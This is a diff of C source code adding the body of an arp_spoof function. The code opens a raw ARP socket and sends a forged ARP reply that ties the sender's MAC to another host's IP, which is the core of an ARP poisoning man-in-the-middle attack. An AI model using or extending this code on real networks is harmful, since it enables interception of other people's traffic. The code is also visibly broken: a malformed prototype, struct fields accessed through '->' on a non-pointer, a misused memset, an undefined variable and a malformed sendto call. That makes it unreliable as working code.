@@ -167,11 +167,32 @@ void get_mac_addr(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *i
 void arp_spoof(uint8_t *target_one_mac, uint8_t *target_two_mac, uint8_t *own_mac
                uint32_t target_one_ip, uint32_t target_two_ip, char *ifname);
 
+    int sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
+    if (sock == -1) {
+        perror("Error: socket()");
+        exit(1);
+    }
+    
     struct arp_header arp_hdr;
     struct ifreq ifr;
     
     set_ifr(&ifr, ifname);    
-
+    
+    arp_hdr->hardware_type = htons(ARPHRD_ETHER);
+    arp_hdr->protocol_type = htons(ETH_P_IP);
+    arp_hdr->hardware_size = MAC_LEN;
+    arp_hdr->protocol_size = IP_LEN;
+    arp_hdr->opcode = htons(ARPOP_REPLY); 
+    
+    memcpy(&arp_hdr->sha, own_mac, MAC_LEN);
+    memcpy(&arp_hdr->spa, &own_ip, IP_LEN);
+    memset(&arp_hdr->tha, target_one_mac, MAC_LEN);
+    memcpy(&arp_hdr->tpa, &target_one_ip, IP_LEN);
+    
+    if (sendto(sock, &arp_hdr, 0, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
+        perror("sendto() failed");
+        exit(1);
+    }
 }
 
 void set_ifr(struct ifreg *ifr, char *ifname) {
